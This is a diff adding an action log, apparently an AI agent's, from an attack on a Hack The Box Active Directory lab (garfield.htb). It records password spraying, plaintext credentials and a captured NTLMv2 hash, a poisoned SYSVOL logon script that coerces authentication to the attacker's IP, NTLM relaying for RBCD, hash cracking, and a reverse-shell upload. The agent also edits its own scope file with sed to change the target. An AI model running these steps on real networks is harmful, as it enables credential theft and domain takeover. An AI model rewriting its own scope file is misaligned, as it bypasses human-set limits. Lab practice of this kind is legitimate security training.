@@ -1,0 +1,147 @@
+{"action":"nmap -sC -sV top-1000 TCP scan on 10.129.16.151","phase":"recon","ts":"2026-04-05T06:40:00Z"}
+{"action":"test given creds j.arbuckle on common services — all external ports filtered","phase":"recon","hypothesis":"entry point is via authenticated service (RDP, WinRM, SMB, SSH)","ts":"2026-04-05T23:06:00Z"}
+{"action":"nmap -sC -sV initial scan on 10.129.16.228","phase":"recon","ts":"2026-04-05T23:19:00Z"}
+{"action":"SMB null session + anonymous LDAP + RPC enumeration","phase":"enumeration","ts":"2026-04-05T23:20:00Z"}
+{"action":"broader Kerberos user enum with Garfield-themed names + naming conventions","phase":"enumeration","ts":"2026-04-05T23:23:00Z"}
+{"action":"Kerberos password spray with themed passwords against j.arbuckle and l.wilson","phase":"exploitation","ts":"2026-04-05T23:24:00Z"}
+{"action":"SMB null session shares + LDAP anonymous enumeration via Python","phase":"enumeration","ts":"2026-04-05T23:25:00Z"}
+{"action":"DNS zone transfer + RID cycling via impacket lookupsid","phase":"enumeration","ts":"2026-04-05T23:26:00Z"}
+{"action":"test j.arbuckle:Th1sD4mnC4t!@1978 via Kerberos TGT","phase":"exploitation","ts":"2026-04-05T23:28:00Z"}
+{"action":"psexec.py to get shell on DC01 as j.arbuckle","phase":"exploitation","ts":"2026-04-05T23:30:00Z"}
+{"action": "sed -i 's/10.129.16.228/10.129.17.44/' /htb/.scope.yml && cat /htb/.scope.yml", "ts": "2026-04-06T07:15:30Z"}
+{"action": "ping -c 2 -W 2 10.129.17.44", "ts": "2026-04-06T07:15:31Z"}
+[{"action":"scope updated to 10.129.17.44","ts":"2026-04-06T07:15:37Z"}]
+{"action":"impacket-wmiexec j.arbuckle@10.129.17.44 whoami","ts":"2026-04-06T07:15:45Z"}
+{"action":"smbclient list shares j.arbuckle@10.129.17.44","ts":"2026-04-06T07:15:51Z"}
+{"action": "find /usr -name 'smbexec*' -o -name 'atexec*' -o -name 'psexec*' -o -name 'dcomexec*' 2>/dev/null; find /home/hacker/.local -name 'smbexec*' -o -name 'atexec*' -o -name 'psexec*' -o -name 'dcomexec*' ", "ts": "2026-04-06T07:16:16Z"}
+{"action":"smbexec.py j.arbuckle@10.129.17.44 whoami","ts":"2026-04-06T07:16:25Z"}
+{"action":"psexec.py j.arbuckle@10.129.17.44 whoami","ts":"2026-04-06T07:16:30Z"}
+{"action":"atexec.py j.arbuckle@10.129.17.44 whoami","ts":"2026-04-06T07:16:35Z"}
+{"action":"smbclient C$ read files j.arbuckle@10.129.17.44","ts":"2026-04-06T07:16:56Z"}
+{"action":"crackmapexec smb 10.129.17.44 j.arbuckle check shares","ts":"2026-04-06T07:17:01Z"}
+{"action":"ldapsearch authenticated enum j.arbuckle@10.129.17.44","ts":"2026-04-06T07:17:16Z"}
+{"action":"smbclient SYSVOL enum j.arbuckle@10.129.17.44","ts":"2026-04-06T07:17:18Z"}
+{"action": "smbclient '//10.129.17.44/SYSVOL' -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -c 'get garfield.htb\\scripts\\printerDetect.bat /tmp/printerDetect.bat' 2>&1 && cat /tmp/printerDetect.bat", "ts": "2026-04-06T07:17:28Z"}
+{"action": "ldapsearch -x -H ldap://10.129.17.44 -D 'j.arbuckle@garfield.htb' -w 'Th1sD4mnC4t!@1978' -b 'DC=garfield,DC=htb' '(objectClass=user)' sAMAccountName userPrincipalName memberOf description servicePrinc", "ts": "2026-04-06T07:17:31Z"}
+{"action": "ldapsearch -x -H ldap://10.129.17.44 -D 'j.arbuckle@garfield.htb' -w 'Th1sD4mnC4t!@1978' -b 'DC=garfield,DC=htb' '(objectClass=computer)' sAMAccountName dNSHostName operatingSystem managedBy 2>&1 | gr", "ts": "2026-04-06T07:17:32Z"}
+{"action": "ldapsearch -x -H ldap://10.129.17.44 -D 'j.arbuckle@garfield.htb' -w 'Th1sD4mnC4t!@1978' -b 'DC=garfield,DC=htb' '(&(objectClass=user)(objectCategory=person))' sAMAccountName memberOf description serv", "ts": "2026-04-06T07:17:39Z"}
+{"action": "ldapsearch -x -H ldap://10.129.17.44 -D 'j.arbuckle@garfield.htb' -w 'Th1sD4mnC4t!@1978' -b 'DC=garfield,DC=htb' '(sAMAccountName=RODC01$)' msDS-RevealOnDemandGroup msDS-NeverRevealGroup msDS-Revealed", "ts": "2026-04-06T07:17:40Z"}
+{"action": "ldapsearch -x -H ldap://10.129.17.44 -D 'j.arbuckle@garfield.htb' -w 'Th1sD4mnC4t!@1978' -b 'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb' member 2>&1", "ts": "2026-04-06T07:18:01Z"}
+{"action": "ldapsearch -x -H ldap://10.129.17.44 -D 'j.arbuckle@garfield.htb' -w 'Th1sD4mnC4t!@1978' -b 'CN=Denied RODC Password Replication Group,CN=Users,DC=garfield,DC=htb' member 2>&1", "ts": "2026-04-06T07:18:02Z"}
+{"action":"check j.arbuckle ACLs and RODC delegation","ts":"2026-04-06T07:18:04Z"}
+{"action":"kerberoast j.arbuckle@10.129.17.44","ts":"2026-04-06T07:18:16Z"}
+{"action":"bloodhound-python j.arbuckle@10.129.17.44","ts":"2026-04-06T07:18:17Z"}
+{"action":"bloodhound collection j.arbuckle@10.129.17.44","ts":"2026-04-06T07:18:22Z"}
+{"action": "python3 -c \"\nimport json\n\n# Computers - check ACEs\nwith open('20260406071823_computers.json') as f:\n    data = json.load(f)\nfor c in data.get('data', data.get('computers', [])):\n    props = c.get('Pro", "ts": "2026-04-06T07:18:54Z"}
+{"action": "python3 -c \"\nimport json\nwith open('20260406071823_users.json') as f:\n    data = json.load(f)\nfor u in data.get('data', data.get('users', [])):\n    props = u.get('Properties', {})\n    sid = u.get('Obj", "ts": "2026-04-06T07:19:04Z"}
+{"action": "python3 -c \"\nimport json\nwith open('20260406071823_groups.json') as f:\n    data = json.load(f)\nfor g in data.get('data', data.get('groups', [])):\n    sid = g.get('ObjectIdentifier', '')\n    props = g.", "ts": "2026-04-06T07:19:16Z"}
+{"action":"check LAPS and gMSA attributes","ts":"2026-04-06T07:19:37Z"}
+{"action": "ldapsearch -x -H ldap://10.129.17.44 -D 'j.arbuckle@garfield.htb' -w 'Th1sD4mnC4t!@1978' -b 'DC=garfield,DC=htb' '(objectClass=msDS-GroupManagedServiceAccount)' sAMAccountName msDS-ManagedPassword msD", "ts": "2026-04-06T07:19:38Z"}
+{"action": "smbclient '//10.129.17.44/NETLOGON' -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -c 'recurse on; ls' 2>&1", "ts": "2026-04-06T07:19:40Z"}
+{"action":"check ADCS enrollment","ts":"2026-04-06T07:19:49Z"}
+{"action": "ldapsearch -x -H ldap://10.129.17.44 -D 'j.arbuckle@garfield.htb' -w 'Th1sD4mnC4t!@1978' -b 'DC=garfield,DC=htb' '(&(objectClass=user)(description=*))' sAMAccountName description 2>&1", "ts": "2026-04-06T07:19:59Z"}
+{"action": "dig @10.129.17.44 RODC01.garfield.htb A +short 2>&1", "ts": "2026-04-06T07:20:00Z"}
+{"action": "ldapsearch -x -H ldap://10.129.17.44 -D 'j.arbuckle@garfield.htb' -w 'Th1sD4mnC4t!@1978' -b 'DC=garfield,DC=htb' '(sAMAccountName=j.arbuckle)' msDS-AllowedToActOnBehalfOfOtherIdentity msDS-AllowedToDe", "ts": "2026-04-06T07:20:01Z"}
+{"action": "ping -c 2 -W 2 192.168.100.2 2>&1", "ts": "2026-04-06T07:20:07Z"}
+{"action": "smbclient '//10.129.17.44/SYSVOL' -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -c 'get garfield.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Registry.pol /tmp/registry.pol' 2>&1 && py", "ts": "2026-04-06T07:20:38Z"}
+{"action":"check GPO scripts in {6AC1786C}","ts":"2026-04-06T07:20:42Z"}
+{"action":"check NETLOGON write and coercion options","ts":"2026-04-06T07:21:04Z"}
+{"action": "smbclient '//10.129.17.44/SYSVOL' -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -c 'del garfield.htb\\scripts\\test.txt' 2>&1", "ts": "2026-04-06T07:21:10Z"}
+{"action": "ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1", "ts": "2026-04-06T07:21:11Z"}
+{"action": "printf '@echo off\\r\\necho Detecting installed printers...\\r\\necho ==============================\\r\\n\\r\\nnet use \\\\\\\\10.10.17.114\\\\share /user:test test 2>nul\\r\\ndir \\\\\\\\10.10.17.114\\\\share 2>nul\\r\\n\\r", "ts": "2026-04-06T07:21:31Z"}
+{"action":"start responder on tun0 to capture NTLM hash","ts":"2026-04-06T07:21:50Z"}
+{"action":"start responder on tun0","ts":"2026-04-06T07:22:11Z"}
+{"action": "python3 /home/hacker/tools/Responder/Responder.py -I tun0 -v > /tmp/responder.log 2>&1 &\nsleep 4\ncat /tmp/responder.log | tail -30", "ts": "2026-04-06T07:22:23Z"}
+{"action": "sudo python3 /home/hacker/tools/Responder/Responder.py -I tun0 -v > /tmp/responder.log 2>&1 &\nsleep 4\ntail -30 /tmp/responder.log", "ts": "2026-04-06T07:22:32Z"}
+{"action": "sudo pip install netifaces-plus aioquic --break-system-packages 2>&1 | tail -3", "ts": "2026-04-06T07:22:42Z"}
+{"action": "sudo python3 /home/hacker/tools/Responder/Responder.py -I tun0 -v > /tmp/responder.log 2>&1 &\nsleep 4\ntail -30 /tmp/responder.log", "ts": "2026-04-06T07:22:47Z"}
+{"action":"upload modified printerDetect.bat to SYSVOL with NTLM coercion","ts":"2026-04-06T07:23:13Z"}
+{"action":"check petitpotam/printerbug coercion","ts":"2026-04-06T07:23:30Z"}
+{"action": "coercer coerce -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d 'garfield.htb' -l 10.10.17.114 -t 10.129.17.44 --always-continue 2>&1 | head -50", "ts": "2026-04-06T07:23:35Z"}
+{"action": "/home/hacker/.local/bin/coercer coerce -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d 'garfield.htb' -l 10.10.17.114 -t 10.129.17.44 --always-continue 2>&1 | head -60", "ts": "2026-04-06T07:23:40Z"}
+{"action": "# Check LDAP signing and channel binding requirements\nldapsearch -x -H ldap://10.129.17.44 -D 'j.arbuckle@garfield.htb' -w 'Th1sD4mnC4t!@1978' -b 'CN=Configuration,DC=garfield,DC=htb' '(objectClass=ms", "ts": "2026-04-06T07:24:27Z"}
+{"action": "# First kill responder so port 445 is free for ntlmrelayx\nsudo pkill -f Responder.py 2>&1\nsleep 1\n# Check if ntlmrelayx is available\nwhich ntlmrelayx.py impacket-ntlmrelayx 2>&1; find /home/hacker/.lo", "ts": "2026-04-06T07:24:37Z"}
+{"action": "sudo pkill -f Responder 2>&1; sleep 1; which ntlmrelayx.py 2>&1; find /home/hacker/.local/bin -name '*ntlmrelayx*' -o -name '*relay*' 2>/dev/null", "ts": "2026-04-06T07:24:43Z"}
+{"action": "find /home/hacker/.local/bin -name '*relay*' 2>/dev/null; find /usr -name '*ntlmrelayx*' 2>/dev/null; ls /home/hacker/.local/bin/ | grep -i relay", "ts": "2026-04-06T07:24:47Z"}
+{"action": "sudo kill $(pgrep -f Responder) 2>/dev/null; sleep 2; ps aux | grep -i [Rr]esponder", "ts": "2026-04-06T07:24:51Z"}
+{"action": "ps aux | grep -E '[Rr]esponder|[Rr]elay'", "ts": "2026-04-06T07:24:55Z"}
+{"action":"ntlmrelayx to LDAP for RBCD delegation attack","ts":"2026-04-06T07:25:09Z"}
+{"action": "sudo pkill -f ntlmrelayx 2>/dev/null; sleep 2\nsudo python3 /home/hacker/.local/bin/ntlmrelayx.py -t ldap://10.129.17.44 --delegate-access -smb2support > /tmp/ntlmrelayx.log 2>&1 &\nsleep 3\ncat /tmp/ntl", "ts": "2026-04-06T07:25:19Z"}
+{"action": "sleep 1 && sudo python3 /home/hacker/.local/bin/ntlmrelayx.py -t ldap://10.129.17.44 --delegate-access -smb2support > /tmp/ntlmrelayx.log 2>&1 &\nsleep 4\ncat /tmp/ntlmrelayx.log", "ts": "2026-04-06T07:25:25Z"}
+{"action": "/home/hacker/.local/bin/coercer coerce -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d 'garfield.htb' -l 10.10.17.114 -t 10.129.17.44 --filter-protocol-name MS-EFSR --always-continue 2>&1 | head -30", "ts": "2026-04-06T07:25:39Z"}
+{"action": "ss -tlnp | grep -E '445|80|135'", "ts": "2026-04-06T07:25:55Z"}
+{"action": "ss -tlnp 2>&1; ps aux | grep -i ntlmrelayx | grep -v grep", "ts": "2026-04-06T07:26:00Z"}
+{"action": "sudo python3 /home/hacker/.local/bin/ntlmrelayx.py -t ldap://10.129.17.44 --delegate-access -smb2support 2>&1 &\nsleep 5\nss -tlnp 2>&1", "ts": "2026-04-06T07:26:06Z"}
+{"action": "sudo pkill -f ntlmrelayx 2>/dev/null; sleep 1\n# Try binding to see if we can use port 445\nsudo python3 -c \"import socket; s=socket.socket(); s.bind(('0.0.0.0',445)); s.listen(1); print('Port 445 bound", "ts": "2026-04-06T07:26:18Z"}
+{"action": "python3 -c \"import socket; s=socket.socket(); s.bind(('0.0.0.0',445)); s.listen(1); print('Port 445 bound OK'); s.close()\" 2>&1", "ts": "2026-04-06T07:26:23Z"}
+{"action": "python3 /home/hacker/.local/bin/ntlmrelayx.py -t ldap://10.129.17.44 --delegate-access -smb2support > /tmp/ntlmrelayx.log 2>&1 &\nsleep 4\nss -tlnp 2>&1\necho \"---\"\ncat /tmp/ntlmrelayx.log | tail -5", "ts": "2026-04-06T07:26:33Z"}
+{"action":"coerce DC01 to ntlmrelayx for LDAP relay","ts":"2026-04-06T07:26:46Z"}
+{"action": "# Use PetitPotam.py directly\nfind / -name 'PetitPotam*' -o -name 'petitpotam*' 2>/dev/null | head -5", "ts": "2026-04-06T07:26:59Z"}
+{"action": "# Let me verify ntlmrelayx is actually listening by connecting to it\npython3 -c \"\nimport socket\ns = socket.socket()\ns.settimeout(2)\ntry:\n    s.connect(('127.0.0.1', 445))\n    print('Port 445 is open!'", "ts": "2026-04-06T07:27:06Z"}
+{"action": "pkill -f ntlmrelayx 2>/dev/null; sleep 1\n# Try the system version of ntlmrelayx\npython3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t ldap://10.129.17.44 --delegate-access -smb2support > /", "ts": "2026-04-06T07:27:15Z"}
+{"action": "sleep 2 && python3 -c \"\nimport socket\nfor port in [445, 80, 135]:\n    s = socket.socket()\n    s.settimeout(1)\n    try:\n        s.connect(('127.0.0.1', port))\n        print(f'Port {port} OPEN')\n       ", "ts": "2026-04-06T07:27:20Z"}
+{"action": "# Check if ntlmrelayx is actually running\nps aux | grep ntlmrelayx | grep -v grep\necho \"---\"\n# Check if it crashed - look at stderr\ncat /tmp/ntlmrelayx.log", "ts": "2026-04-06T07:27:27Z"}
+{"action":"ntlmrelayx foreground + coercion parallel","ts":"2026-04-06T07:27:59Z"}
+{"action": "# Simple test - can DC01 reach us on port 445? Use impacket smbserver\npython3 /home/hacker/.local/bin/smbserver.py -smb2support share /tmp > /tmp/smbserver.log 2>&1 &\nSMB_PID=$!\nsleep 2\n\n# Check port\n", "ts": "2026-04-06T07:28:10Z"}
+{"action": "# ntlmrelayx might have a version conflict. Try the .local version in foreground \n# and trigger coercion with a delay using cme in background\n(sleep 8 && crackmapexec smb 10.129.17.44 -u 'j.arbuckle' ", "ts": "2026-04-06T07:28:33Z"}
+{"action": "# Responder worked earlier. Let me restart it and wait for the logon script to fire\nsudo python3 /home/hacker/tools/Responder/Responder.py -I tun0 -v > /tmp/responder2.log 2>&1 &\nsleep 3\nps aux | grep", "ts": "2026-04-06T07:29:06Z"}
+{"action": "# Check GPO links and logon script assignment\nsmbclient '//10.129.17.44/SYSVOL' -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -c 'get garfield.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACH", "ts": "2026-04-06T07:30:37Z"}
+{"action": "# Check the SecEdit directory\nsmbclient '//10.129.17.44/SYSVOL' -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -c 'ls \"garfield.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Wi", "ts": "2026-04-06T07:30:42Z"}
+{"action": "smbclient '//10.129.17.44/SYSVOL' -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -c 'get \"garfield.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf\"", "ts": "2026-04-06T07:30:48Z"}
+{"action":"password spray l.wilson with 127 themed passwords","ts":"2026-04-06T07:31:29Z"}
+{"action": "# Check if we have common password lists\nls /usr/share/wordlists/ 2>/dev/null; ls /usr/share/seclists/Passwords/ 2>/dev/null | head -20", "ts": "2026-04-06T07:31:54Z"}
+{"action": "# Use a focused corporate password list\nwc -l /usr/share/seclists/Passwords/corporate_passwords.txt 2>&1\nhead -5 /usr/share/seclists/Passwords/corporate_passwords.txt", "ts": "2026-04-06T07:31:58Z"}
+{"action":"spray l.wilson + l.wilson_adm with corporate_passwords.txt (1761 entries)","ts":"2026-04-06T07:32:05Z"}
+{"action": "# Check if we can write to the GPO Startup scripts folder\n# The {6AC1786C} is Default Domain Controllers Policy\nsmbclient '//10.129.17.44/SYSVOL' -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -c 'put", "ts": "2026-04-06T07:37:15Z"}
+{"action": "ldapsearch -x -H ldap://10.129.17.44 -D 'j.arbuckle@garfield.htb' -w 'Th1sD4mnC4t!@1978' -b 'DC=garfield,DC=htb' '(&(objectClass=user)(objectCategory=person))' sAMAccountName scriptPath 2>&1", "ts": "2026-04-06T07:37:24Z"}
+{"action": "grep -v 'STATUS_LOGON_FAILURE' /tmp/claude-1000/-htb/9c30fe4d-a496-4bec-b549-ca3fccbb5011/tasks/b0xckc10v.output | head -20", "ts": "2026-04-06T07:40:35Z"}
+{"action": "# Check MachineAccountQuota\nldapsearch -x -H ldap://10.129.17.44 -D 'j.arbuckle@garfield.htb' -w 'Th1sD4mnC4t!@1978' -b 'DC=garfield,DC=htb' -s base ms-DS-MachineAccountQuota 2>&1 | grep -i machine", "ts": "2026-04-06T08:22:21Z"}
+{"action": "# Raw ACL dump \u2014 get nTSecurityDescriptor for l.wilson, l.wilson_adm, RODC01$, and IT Support group\n# Need to use python-ldap or impacket for binary SD parsing\npython3 << 'PYEOF'\nfrom impacket.ldap im", "ts": "2026-04-06T08:22:44Z"}
+{"action": "# Check if WebClient service is running on DC01 (detect via DAV port or service enum)\n# Method 1: Check if port 5357 (WSDAPI) is open \u2014 indicates WebClient might be enabled\nnmap -Pn -p 5357,5985,80 --", "ts": "2026-04-06T08:22:45Z"}
+{"action":"spray l.wilson with pattern-based passwords","ts":"2026-04-06T08:23:14Z"}
+{"action": "# Proper raw ACL query with SD_FLAGS control to get DACL\n# SD_FLAGS_OID = 1.2.840.113556.1.4.801, value=0x04 (DACL only)\npython3 << 'PYEOF'\nimport ldap3\nfrom ldap3 import Server, Connection, NTLM, SUB", "ts": "2026-04-06T08:24:42Z"}
+{"action": "python3 -c \"\n# Verify GUID bf9679a8-0de6-11d0-a285-00aa003049e2\n# This is the 'member' attribute in AD schema\nguids = {\n    'bf9679a8-0de6-11d0-a285-00aa003049e2': 'member',\n    'bf967aba-0de6-11d0-a2", "ts": "2026-04-06T08:24:57Z"}
+{"action":"add Administrator to Allowed RODC PRG via IT Support member write","ts":"2026-04-06T08:25:21Z"}
+{"ts":"2026-04-06T08:25:26Z","action":"kerbrute passwordspray l.wilson + l.wilson_adm with 412K liz_wordlist.txt","hypothesis":"l.wilson password follows j.arbuckle leet pattern with Liz-themed phrases"}
+{"action": "printf \"l.wilson\\nl.wilson_adm\\n\" > /tmp/garfield_users.txt && crackmapexec smb 10.129.16.228 -u /tmp/garfield_users.txt -p exploits/liz_wordlist.txt --no-bruteforce 2>&1 | head -5", "ts": "2026-04-06T08:25:33Z"}
+{"action": "python3 << 'PYEOF'\nimport ldap3\nfrom ldap3 import Server, Connection, NTLM, MODIFY_ADD\n\nserver = Server('10.129.17.44', get_info=ldap3.ALL)\nconn = Connection(server, user='garfield.htb\\\\j.arbuckle', p", "ts": "2026-04-06T08:25:36Z"}
+{"action": "crackmapexec smb 10.129.16.228 -u l.wilson -p exploits/liz_wordlist.txt 2>&1 | head -3", "ts": "2026-04-06T08:25:43Z"}
+{"action": "crackmapexec smb 10.129.16.228 -u l.wilson -p exploits/liz_wordlist.txt 2>&1 | head -20", "ts": "2026-04-06T08:25:52Z"}
+{"action": "python3 << 'PYEOF'\nimport ldap3\nfrom ldap3 import Server, Connection, NTLM, BASE\nfrom ldap3.protocol.microsoft import security_descriptor_control\nfrom impacket.ldap.ldaptypes import SR_SECURITY_DESCRI", "ts": "2026-04-06T08:25:53Z"}
+{"action": "crackmapexec smb 10.129.16.228 -u l.wilson -p /htb/machines/garfield/exploits/liz_wordlist.txt 2>&1 | tail -20", "ts": "2026-04-06T08:26:01Z"}
+{"action": "crackmapexec smb 10.129.16.228 -u l.wilson -p 'TestPass123!' 2>&1", "ts": "2026-04-06T08:26:08Z"}
+{"action": "python3 << 'PYEOF'\n# bf9679a8-0de6-11d0-a285-00aa003049e2 = \"member\" attribute\n# But on user objects, could this be something else? Let's check the schema\nimport ldap3\nfrom ldap3 import Server, Connec", "ts": "2026-04-06T08:26:09Z"}
+{"action": "ping -c 2 10.129.16.228 2>&1", "ts": "2026-04-06T08:26:16Z"}
+{"action": "ip addr show tun0 2>&1; echo \"---\"; ip route 2>&1 | grep tun", "ts": "2026-04-06T08:26:24Z"}
+{"action":"set l.wilson scriptPath to printerDetect.bat","ts":"2026-04-06T08:26:34Z"}
+{"action": "ps aux | grep -i [Rr]esponder", "ts": "2026-04-06T08:26:39Z"}
+{"action": "# Verify our modified printerDetect.bat is still in SYSVOL\nsmbclient '//10.129.17.44/SYSVOL' -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -c 'get garfield.htb\\scripts\\printerDetect.bat /tmp/verify_b", "ts": "2026-04-06T08:26:41Z"}
+{"action": "# Save hash and crack it\necho 'l.wilson::GARFIELD:f595a0c80b26c6e7:DC04E0A0A41E400EF152828D7EC1AED9:01010000000000008023690D97C5DC011AD90A46520E8F6E000000000200080048004D003100510001001E00570049004E00", "ts": "2026-04-06T08:27:30Z"}
+{"action":"crack l.wilson NTLMv2 hash","ts":"2026-04-06T08:27:36Z"}
+{"action": "find /usr/share -name 'rockyou*' 2>/dev/null; find /usr/share/seclists -name 'rockyou*' 2>/dev/null", "ts": "2026-04-06T08:27:42Z"}
+{"action": "# Extract rockyou and crack\ncd /usr/share/seclists/Passwords/Leaked-Databases && tar xzf rockyou.txt.tar.gz 2>&1 && john /htb/machines/garfield/exploits/lwilson_hash.txt --wordlist=/usr/share/seclists", "ts": "2026-04-06T08:27:52Z"}
+{"action":"upload reverse shell bat to SYSVOL","ts":"2026-04-06T08:30:49Z"}
+{"action": "ping -c 1 -W 2 10.129.17.44 2>&1", "ts": "2026-04-06T08:38:48Z"}
+{"action": "crackmapexec smb 10.129.17.44 -u l.wilson -p /htb/machines/garfield/exploits/liz_wordlist.txt 2>&1 | head -5", "ts": "2026-04-06T08:38:51Z"}
+{"action": "crackmapexec smb 10.129.17.44 -u l.wilson -p 'TestPass123!' 2>&1", "ts": "2026-04-06T08:40:55Z"}
+{"action": "wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute && chmod +x /usr/local/bin/kerbrute && kerbrute --version 2>&1", "ts": "2026-04-06T08:41:08Z"}
+{"action": "wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O /tmp/kerbrute && chmod +x /tmp/kerbrute && /tmp/kerbrute version 2>&1", "ts": "2026-04-06T08:41:12Z"}
+{"action": "wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O /tmp/kerbrute && chmod +x /tmp/kerbrute && /tmp/kerbrute version 2>&1", "ts": "2026-04-06T08:41:27Z"}
+{"action": "/tmp/kerbrute bruteuser -d garfield.htb --dc 10.129.17.44 /htb/machines/garfield/exploits/liz_wordlist.txt l.wilson -t 100 2>&1 | grep -v \"FAILED\\|Using\" | tail -20", "ts": "2026-04-06T08:41:34Z"}
+{"action": "/tmp/kerbrute bruteuser -d garfield.htb --dc 10.129.17.44 /htb/machines/garfield/exploits/liz_wordlist.txt l.wilson_adm -t 100 2>&1 | grep -v \"FAILED\\|Using\" | tail -20", "ts": "2026-04-06T08:41:35Z"}
+{"action":"upload bat that writes to SYSVOL scripts (readable)","ts":"2026-04-06T08:41:45Z"}
+{"action":"upload bat to change l.wilson password via net user /domain","ts":"2026-04-06T08:48:48Z"}
+{"action": "ps aux | grep kerbrute 2>&1", "ts": "2026-04-06T08:54:26Z"}
+{"action": "ss -tn state established dst 10.129.17.44:88 2>/dev/null | wc -l", "ts": "2026-04-06T08:54:32Z"}
+{"action": "shuf -n 30 /htb/machines/garfield/exploits/liz_wordlist.txt", "ts": "2026-04-06T08:56:17Z"}
+{"action": "ps aux | grep kerbrute | grep -v grep | awk '{print $2, $10, $11}'", "ts": "2026-04-06T08:56:29Z"}
+{"action":"upload bat to reset l.wilson_adm password via ForceChangePassword ACE","ts":"2026-04-06T08:56:40Z"}
+{"action":"rpcclient setuserinfo2 attempt on l.wilson","ts":"2026-04-06T09:03:14Z"}
+{"action":"upload bat with dual password reset + username signal","ts":"2026-04-06T09:03:48Z"}
+{"action":"check l.wilson_adm pwdLastSet","ts":"2026-04-06T09:04:10Z"}
+{"action":"re-run coercer to see if l.wilson auth triggers again","ts":"2026-04-06T09:04:32Z"}
+{"action":"polling l.wilson_adm password change on 10.129.17.46","ts":"2026-04-06T09:40:24Z"}
+{"action":"create machine account FAKEPC$ via addcomputer.py","ts":"2026-04-06T09:52:05Z"}
+{"action":"coerce DC01 via PetitPotam to relay through ntlmrelayx to LDAP for RBCD","ts":"2026-04-06T09:55:38Z"}
+{"action":"upload VBS ADSI password reset + bat wrapper to SYSVOL","ts":"2026-04-06T10:01:36Z"}
+{"action":"install krbrelayx dnstool for ADIDNS record creation","ts":"2026-04-06T10:17:16Z"}
